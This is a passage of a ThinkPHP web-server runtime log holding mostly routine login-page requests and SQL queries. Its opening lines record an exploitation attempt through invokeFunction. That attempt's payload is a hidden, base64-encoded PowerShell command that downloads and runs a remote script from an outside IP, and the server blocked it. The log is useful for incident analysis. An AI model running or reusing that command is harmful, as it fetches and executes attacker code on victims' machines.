      0 => 'cmd.exe /c powershell -windowstyle hidden -nop -enc aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQA4ADEALgAxADAALgAyADMANAAvAEUANQBEAEIAMABFADAANwBDADMARAA3AEIARQA4ADAAVgA1ADIAMAAvAGkAbgBpAHQALgBwAHMAMQAnACkA',
    ),
  ),
)
[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/web/core/library/think/App.php ]
[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {

  - Parameters [2] {
    Parameter #0 [ <required> $function_name ]
    Parameter #1 [ <required> $parameters ]
  }
}

[ info ] [ LOG ] INIT File
[ error ] [2]system() has been disabled for security reasons[/www/wwwroot/web/core/library/think/App.php:174]
---------------------------------------------------------------
[ 2019-09-26T21:51:36+08:00 ] 172.16.170.169 47.110.243.116 GET /
[ info ] 47.96.126.228:80/ [运行时间：0.027173s][吞吐率：36.80req/s] [内存消耗：3,923.16kb] [文件加载：57]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228:80',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000302s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000658s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000161s ]
---------------------------------------------------------------
[ 2019-09-26T21:51:36+08:00 ] 172.16.170.169 47.110.243.116 GET /user/index/login
[ info ] 47.96.126.228:80/user/index/login [运行时间：0.034891s][吞吐率：28.66req/s] [内存消耗：3,961.01kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228:80',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'connection' => 'close',
  'referer' => 'http://47.96.126.228:80',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000309s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000701s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000176s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000631s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000133s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000479s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000113s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000463s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000135s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000432s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228:80' LIMIT 1 [ RunTime:0.000124s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000478s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000144s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000214s ]
[ log ] ###user_id=time=2019-09-26 21:51:36function=user/index/login
---------------------------------------------------------------
[ 2019-09-26T23:23:19+08:00 ] 172.16.170.169 180.163.220.67 GET /user/index/login
[ info ] 47.96.126.228/user/index/login [运行时间：0.035586s][吞吐率：28.10req/s] [内存消耗：4,000.88kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'upgrade-insecure-requests' => '1',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000332s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000714s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000196s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000643s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000149s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000497s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000114s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000506s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000154s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000489s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000139s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000448s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000134s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000162s ]
[ log ] ###user_id=time=2019-09-26 23:23:19function=user/index/login
---------------------------------------------------------------
[ 2019-09-26T23:23:20+08:00 ] 172.16.170.169 180.163.220.5 GET /user/index/login
[ info ] 47.96.126.228/user/index/login [运行时间：0.035438s][吞吐率：28.22req/s] [内存消耗：3,962.88kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.baidu.com/',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
  0 => 'request',
  1 => 'param',
  2 => 'userAgentType',
  3 => 'is_super',
  4 => 'allcinfig',
  5 => 'msgNum',
  6 => '__menu__',
  7 => 'meta_title',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000340s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000732s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000167s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000653s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000164s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000451s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000116s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000470s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000147s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000425s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000128s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000416s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000157s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000161s ]
[ log ] ###user_id=time=2019-09-26 23:23:20function=user/index/login
---------------------------------------------------------------
[ 2019-09-26T23:23:23+08:00 ] 172.16.170.169 180.163.220.4 GET /user/index/verify
[ info ] 47.96.126.228/user/index/verify [运行时间：0.035543s][吞吐率：28.13req/s] [内存消耗：3,950.88kb] [文件加载：55]
[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'index',
    2 => 'verify',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.96.126.228',
  'connection' => 'keep-alive',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 baidu.sogo.uc.UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN',
  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
  'referer' => 'http://47.96.126.228/user/index/login',
  'accept-encoding' => 'gzip, deflate',
  'cookie' => 'PHPSESSID=f5i5sfoiidil5dv4m09bvej7n3',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'prefix' => 'user',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000304s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000655s ]
[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000173s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000662s ]
[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000165s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000455s ]
[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000110s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000455s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000138s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000440s ]
[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000139s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000439s ]
[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000134s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000153s ]
[ log ] ###user_id=time=2019-09-26 23:23:23function=user/index/verify
